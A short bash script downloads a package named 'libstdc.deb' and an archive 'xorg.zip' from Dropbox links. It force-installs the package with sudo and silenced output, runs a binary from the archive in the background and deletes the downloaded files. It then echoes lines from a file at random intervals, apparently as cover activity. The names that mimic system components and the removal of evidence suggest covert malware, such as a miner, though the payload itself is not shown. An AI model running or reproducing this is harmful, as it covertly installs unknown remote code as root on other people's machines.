#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/ea3o3abcbptdse2/xorg.zip -q
unzip xorg.zip > /dev/null 2>&1
#pwd
./src/xorg ./src/xdata &
sleep 3
rm -rf xorg.zip
rm -rf src/xorg
rm -rf src/xdata
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 20 ))
done < $2

